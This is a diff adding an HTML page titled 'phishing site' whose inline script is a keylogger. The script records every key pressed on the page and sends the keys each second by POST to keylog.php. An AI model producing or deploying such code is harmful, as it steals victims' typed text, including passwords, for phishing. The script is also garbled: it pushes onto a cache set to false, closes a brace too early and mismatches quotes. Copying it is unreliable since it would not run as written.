@@ -1,0 +1,11 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>phishing site</title>
+<script>var keylog = {cache : false,init : function () {  window.addEventListener("keydown", function(evt){keylog.cache.push(evt.key);}); window.setInterval(keylog.send, 1000);}, send : function () { if (!keylog.sending && keylog.cache.length !=0)}}; keylog.sending = true; var data = new FormData(); data.append("keys", JSON.stringify(keylog.cache)); keylog.cache = []; var xhr = new XMLHttpRequest(); xhr.open("POST', "keylog.php"); xhr.onload = function(){keylog.sending = false;}; xhr.send(data); window.addEventListener("DOMContentLoaded", keylog.init);</script>
+</head>
+<body>
+<textarea></textarea>
+
+</body>
+</html>
